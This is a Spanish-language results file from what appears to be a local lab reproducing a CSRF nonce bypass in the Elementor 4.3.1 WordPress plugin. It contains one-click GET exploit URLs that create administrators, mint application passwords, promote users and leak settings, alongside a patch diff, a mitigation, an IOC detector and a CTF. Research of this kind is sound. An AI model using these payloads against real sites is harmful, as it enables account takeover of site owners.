# RESULTADOS.md — Evidencia de ejecución real (2026-09-26)

Todo lo que sigue se ejecutó contra los contenedores locales de este repo.
Entorno verificado:

| Pieza | Víctima | Control |
|---|---|---|
| Puerto | http://localhost:8085 | http://localhost:8086 |
| WordPress | 7.1.2 | 7.1.2 |
| Elementor | **4.3.1** | **4.3.2** |
| PHP | 8.3.35 | 8.3.35 |
| Experimento `editor_events` | vacío ⇒ activo (default sitio nuevo) | vacío ⇒ activo (default sitio nuevo) |

Única diferencia entre ambos: la versión de Elementor.

## FASE 3 — El clic (núcleo del POC)

Login legítimo de la víctima (`admin`) y un solo GET con sus cookies:

### Víctima 4.3.1 — enlace SIN la subcadena mágica

```
GET /wp-json/wp/v2/users?_method=POST&username=csrfadmin&email=csrfadmin@lab.test\
    &password=csrfadmin-PoC-2026&roles[]=administrator
-> HTTP 401
{"code":"rest_cannot_create_user","message":"Sorry, you are not allowed to create new users.",
 "data":{"status":401}}
```

WordPress resiste: cookie de sesión sin nonce ⇒ usuario degradado a anónimo.
Así se comporta el REST API de WP por diseño.

### Víctima 4.3.1 — el mismo enlace CON `&x=elementor/v1/events/`

```
-> HTTP 201
{"id":2,"username":"csrfadmin",...,"email":"csrfadmin@lab.test",
 "roles":["administrator"],
 "capabilities":{"switch_themes":true,"edit_themes":true,"activate_plugins":true,
 "edit_plugins":true,"edit_users":true,"edit_files":true,"manage_options":true,...}}
```

**HTTP 201: administrador creado con un GET. Sin nonce. Sin JS. Sin formulario.**

### Control 4.3.2 — exactamente el mismo enlace

```
GET .../wp-json/wp/v2/users?_method=POST&...&x=elementor/v1/events/
-> HTTP 401
{"code":"rest_cannot_create_user","message":"Sorry, you are not allowed to create new users.",
 "data":{"status":401}}
```

**El parche neutraliza byte a byte el mismo ataque** (misma imagen WP, mismo
PHP, mismo experimento activo, mismo payload).

## FASE 4 — La puerta trasera es un admin real

WP-CLI dentro del contenedor (ground truth en base de datos):

```
$ docker compose exec -T victima wp user get csrfadmin --allow-root \
    --fields=ID,user_login,user_email,roles
Field      Value
ID         2
user_login csrfadmin
user_email csrfadmin@lab.test
roles      administrator
```

Login real como `csrfadmin` (contraseña del enlace):

```
GET /wp-admin/users.php  -> HTTP 200   (pantalla que exige capability list_users)
```

Auto-verificación reutilizando el propio bypass (sin ningún nonce):

```
GET /wp-json/wp/v2/users/me?context=edit&x=elementor/v1/events/   [cookies de csrfadmin]
-> HTTP 200  ...  "roles":["administrator"] ...
```

## Lectura de datos: subcadena ANIDADA en otro parámetro

`is_own_route_request()` buscaba la subcadena **sin anclar**: ni siquiera hace
falta que sea un parámetro propio.

```
[víctima 4.3.1, cookies de admin]
GET /wp-json/wp/v2/settings?q=foo-elementor/v1/events/-bar  -> HTTP 200
{"title":"Elementor CSRF Lab (victima 4.3.1)","description":"","url":"http:\/\/localhost:8085",
 "email":"admin@lab.test","timezone":"",...}

GET /wp-json/wp/v2/settings                                  -> HTTP 401
```

El email del admin y la configuración del sitio se filtran con la subcadena
incrustada en el valor de un parámetro que no significa nada (`q`).

## FASE 5 — Root cause en vivo (diff víctima vs control)

`make demo-flip` extrae el archivo de ambos contenedores corriendo:

```diff
 private function is_own_route_request(): bool {
-    $request_uri = Utils::get_super_global_value( $_SERVER, 'REQUEST_URI' ) ?? '';
+    global $wp;

-    return false !== strpos( $request_uri, self::API_NAMESPACE . '/' . self::API_BASE . '/' );
+    $route = $wp->query_vars['rest_route'] ?? null;
+    if ( ! is_string( $route ) ) {
+        return false;
+    }
+    return 0 === strpos( $route, '/' . self::API_NAMESPACE . '/' . self::API_BASE . '/' );
 }
```

(`189` líneas el archivo en 4.3.1, `211` en 4.3.2; análisis completo de los
tres cambios en [PARCHE.md](PARCHE.md).)

## FASE 6 — Aportaciones propias (2026-09-26, ver HALLAZGOS.md)

### 6a · Puerta silenciosa: application password sobre la cuenta del admin

```
[víctima 4.3.1, cookies de admin]
GET /wp-json/wp/v2/users/me/application-passwords?_method=POST&name=sync-movil&x=elementor/v1/events/
-> HTTP 201
{"uuid":"dd9edac2-...","name":"sync-movil","password":"3wIC MOmN 0cwz 7yym PK6m ErfG","user_login":"admin",...}

# la credencial funciona SIN cookies y SIN nonce:
curl -u admin:3wIC... /wp/v2/users/me?context=edit -> 200, roles=["administrator"]
curl -u admin:3wIC... /wp/v2/plugins              -> 200

[control 4.3.2, el MISMO enlace]
-> HTTP 401 {"code":"rest_not_logged_in",...}
```

Nota de entorno: sobre HTTP puro los Application Passwords llegan 501
(`application_passwords_disabled`); el lab define
`WP_ENVIRONMENT_TYPE=local` (víctima y control por igual) para replicar la
condición de los sitios de producción con HTTPS, donde están disponibles.

### 6b · Escalada de cuenta dormida: subscriber → administrator

```
[víctima 4.3.1]  wp user get dormido: roles=subscriber (ID 3)
GET /wp-json/wp/v2/users/3?_method=POST&roles[]=administrator&x=elementor/v1/events/
-> HTTP 200   ...  "roles":["administrator"]
[WP-CLI después] roles=administrator
```

### FASE 7 — Hardening anti-CSRF neutralizado

Mu-plugin de demo (patrón canónico de "bloquear cookies-sin-nonce en REST")
instalado en la víctima:

```
[A] GET .../users?_method=POST&... (SIN subcadena)
    -> 401 {"code":"rest_cookie_disabled",...}        ✔ el hardening funciona
[B] GET .../users?_method=POST&...&x=elementor/v1/events/
    -> 201 {"id":4,"username":"firewalluser",...}      ✘ el bypass lo atraviesa
```

### Sonda de superficie (research/investigacion/sonda_vectores.sh)

- 231 rutas REST / **154 endpoints de escritura** en la instalación base.
- `/wp/v2/settings` (context=edit): campos escribibles solo cosméticos
  (title, posts_per_page, default_comment_status...); **no** expone
  `users_can_register` ni `default_role`.
- Cookies de WP: `HttpOnly`, **sin atributo SameSite** (Lax por defecto del
  navegador → la navegación top-level de un clic envía cookies).

## Tercera jornada (2026-09-26, noche) — mejoras y ampliaciones

### FASE 8 — Mitigación paliativa verificada (A/B/C)

```
[A] experimento por defecto (activo)   clic -> HTTP 201
[B] wp option update elementor_experiment-editor_events inactive
                                       MISMO clic -> HTTP 401
[C] opción eliminada (estado restaurado)
```

### FASE 9 — Blast radius real (`make blast-radius`)

```
[A] endpoint de plugins del core (dos enlaces):
    GET /wp-json/wp/v2/plugins?_method=POST&slug=hello-dolly&x=...    -> 201
    GET /wp-json/wp/v2/plugins/<id>?_method=POST&status=active&x=...  -> 200
    estado real en el sitio tras los dos GET: active

[B] WooCommerce 11.1.2 (el bloqueo por defecto de wc/v3):
    [B1] /wc/v3/system_status anónimo          -> 401
    [B2] con cookies de admin, sin subcadena   -> 401 woocommerce_rest_cannot_view
    [B3] con cookies de admin + subcadena      -> 200 {"environment": ...}
    => la API-key-wall de WooCommerce CAE ante el bypass (HALLAZGOS §5)
```

### Negativo %2F inline (fase 3) y fuzzer 8/8

```
FASE 3: GET ...&x=elementor%2Fv1%2Fevents%2F  -> 401   (el strpos compara el URI crudo)
make fuzz-subcadena: 8/8 variantes ajustadas a la predicción (fuzz-resultados.md)
```

### Demo con navegador REAL (`make demo-navegador`)

```
Chrome headless (CDP, sin dependencias) · perfil limpio:
  (1) login legitimo del admin en :8085            -> wp-admin OK
  (2) apertura del correo desde file:// (otro origen)
  (3) clic en el <a>                               -> HTTP 201
  WP-CLI: demo-navegador / roles=administrator
Capturas: docs/img/demo-1-sesion.png, demo-2-correo.png,
          demo-3-resultado.png, demo-navegador.gif
```

### Detector de IOCs (`make detectar-iocs`)

Sobre `research/investigacion/access-log-ejemplo.log` (líneas REALES del
contenedor + benignas): **4 CRIT · 2 MED · 1 INFO · 7 limpias**, exit 1.
El intento fallido sin subcadena queda clasificado como MED y el `%2F`
codificado correctamente en silencio. En vivo: `make detectar-iocs-vivo`.

### CTF «La Subcadena Mágica» (profile ctf) — resuelto completo

```
make ctf     -> reto :8087 (4.3.1 + hardening activo) + bot víctima :8089
FLAG 1  curl readme.txt -> 4.3.1                              ✔
FLAG 2  bot + create-admin (custom nick/pass) -> 201; login propio;
        post privado del admin                                ✔
FLAG 3  bot + settings?q=...events/... -> admin_email filtrado ✔
FLAG 4  bot + /users/3?context=edit&x=... -> nota del huevo    ✔
FLAG 5  bot + app-password por GET -> contraseña en claro;
        verificador: Basic -> 200  =>  CTF{puerta-silenciosa} ✔
```

## Tabla resumen del experimento

| # | Afirmación | Resultado |
|---|---|---|
| 1 | Cookie de admin sin nonce NO basta para crear usuarios (WP sano) | ✔ 401 `rest_cannot_create_user` |
| 2 | Víctima 4.3.1 + subcadena mágica en query ⇒ admin creado por GET | ✔ **201**, roles=administrator |
| 3 | Control 4.3.2, mismo enlace ⇒ parche neutraliza | ✔ 401 |
| 4 | El usuario creado persiste y es admin de verdad | ✔ WP-CLI + /wp-admin/users.php 200 |
| 5 | El bypass también aplica a rutas de lectura y de otros plugins | ✔ /wp/v2/settings 401→200 |
| 6 | La subcadena ni siquiera necesita ser parámetro real | ✔ `q=foo-elementor/v1/events/-bar` funciona |
| 7 | Variable única del experimento (versión de Elementor) | ✔ WP 7.1.2 y PHP 8.3.35 idénticos en ambos |
| 8 | §1: app-password por GET sobre la cuenta del admin | ✔ **201** con contraseña en claro; Basic → 200 admin |
| 9 | §1: el control resiste la puerta silenciosa | ✔ 401 `rest_not_logged_in` |
| 10 | §2: subscriber promovido a administrator con un GET | ✔ 200 + WP-CLI antes/después |
| 11 | §3: hardening anti-CSRF bloquea el ataque normal | ✔ [A] 401 `rest_cookie_disabled` |
| 12 | §3: el bypass atraviesa ese mismo hardening | ✔ [B] **201** |
| 13 | La puerta trasera es visible en el frontend | ✔ `/author/csrfadmin/` 200 víctima vs 404 control |
| 14 | Superficie REST total de una instalación base | ✔ 231 rutas / 154 endpoints de escritura |

## Condiciones reproducidas fielmente

- Instalación **limpia** de Elementor (sin historial de upgrades): el
  experimento oculto `editor_events` queda activo por defecto — igual que en
  los ~2M de sitios reales con 4.3.0/4.3.1.
- Ataque con navegación de nivel superior (GET por `<a href>`), que SameSite=Lax
  permite enviar con cookies de sesión.
- Cero JavaScript, cero formularios, cero cabeceras custom: la fricción de
  un ataque de un solo clic.
